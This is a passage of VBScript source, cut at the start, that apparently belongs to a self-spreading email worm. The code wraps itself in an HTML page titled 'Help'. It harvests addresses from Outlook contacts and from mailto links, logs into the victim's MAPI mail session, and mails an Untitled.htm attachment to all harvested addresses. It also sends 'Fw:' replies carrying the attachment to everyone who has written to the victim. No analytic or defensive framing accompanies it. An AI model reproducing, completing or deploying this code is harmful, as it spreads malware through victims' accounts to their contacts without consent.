Set Shell = CreateObject("Shell.Application")
mPath = "C:\"
For Each mShell In Shell.NameSpace(mPath).Items
If mShell.IsFolder Then
Grf = mShell.Path
Exit Function
End If
Next
If Er Then
Grf = ""
End If
End Function
Function Gsf()
Dim Of, m
On Error Resume Next
Set Of = CreateObject("Scripting.FileSystemObject")
m = Of.GetSpecialFolder(0)
If Er Then
Gsf = "C:\"
Else
Gsf = m
End If
End Function
Function Lhtml()
Lhtml = "<" & "HTML" & "><HEAD" & ">" & vbCrLf & _
"<" & "Title> Help </Title" & "><" & "/HEAD>" & vbCrLf & _
"<" & "Body> " & Lscript(Lvbs()) & vbCrLf & _
"<" & "/Body></HTML" & ">"
End Function
Function Lscript(S)
Lscript = "<" & "script language='VBScript'>" & vbCrLf & _
S & "<" & "/script" & ">"
End Function
Function Sl(S1, S2, n)
Dim l1, l2, l3, i
l1 = Len(S1)
l2 = Len(S2)
i = InStr(S1, S2)
If i > 0 Then
l3 = i + l2 - 1
If n = 0 Then
Sl = Left(S1, i - 1)
ElseIf n = 1 Then
Sl = Right(S1, l1 - l3)
End If
Else
Sl = ""
End If
End Function
Function Ml(S)
Dim S1, S3, S2, T, adds, m
S1 = S
S3 = """"
adds = ""
S2 = S3 & "mailto" & ":"
T = True
Do While T
S1 = Sl(S1, S2, 1)
If S1 = "" Then
T = False
Else
m = Sl(S1, S3, 0)
If IsMail(m) Then
adds = adds & m & vbCrLf
End If
End If
Loop
Ml = Split(adds, vbCrLf)
End Function
Function Og()
Dim i, n, m(), Om, Oo
Set Oo = CreateObject("Outlook.Application")
Set Om = Oo.GetNamespace("MAPI").GetDefaultFolder(10).Items
n = Om.Count
ReDim m(n)
For i = 1 To n
m(i - 1) = Om.Item(i).Email1Address
Next
Og = m
End Function
Sub Tsend()
Dim Od, MS, MM, a, m
Set Od = CreateObject("Scripting.Dictionary")
MConnect MS, MM
MM.FetchSorted = True
MM.Fetch
For i = 0 To MM.MsgCount - 1
MM.MsgIndex = i
a = MM.MsgOrigAddress
If Od.Item(a) = "" Then
Od.Item(a) = MM.MsgSubject
End If
Next
For Each m In Od.Keys
MM.Compose
MM.MsgSubject = "Fw: " & Od.Item(m)
MM.RecipAddress = m
MM.AttachmentPathName = Gsf & "\Untitled.htm"
MM.Send
Next
MS.SignOff
End Sub
Function MConnect(MS, MM)
Dim U
On Error Resume Next
Set MS = CreateObject("MSMAPI.MAPISession")
Set MM = CreateObject("MSMAPI.MAPIMessages")
U = Rg("HKEY_CURRENT_USER\Software\Microsoft\Windows Messaging Subsystem\Profiles\DefaultProfile")
MS.UserName = U
MS.DownLoadMail = False
MS.NewSession = False
MS.LogonUI = True
MS.SignOn
MM.SessionID = MS.SessionID
End Function
Sub Msend(Address)
Dim MS, MM, i, a
MConnect MS, MM
i = 0
MM.Compose
For Each a In Address
If IsMail(a) Then
MM.RecipIndex = i
MM.RecipAddress = a
i = i + 1
End If
Next
MM.MsgSubject = " Help "
MM.AttachmentPathName = Gsf & "\Untitled.htm"
MM.Send
MS.SignOff
End Sub
Function Er()
If Err.Number = 0 Then
Er = False
Else
Err.Clear
Er = True
End If
End Function
Function IsDel(S)
If Mid(S, 4, 1) = 1 Then
IsDel = True
Else
IsDel = False
End If
End Function








</script>
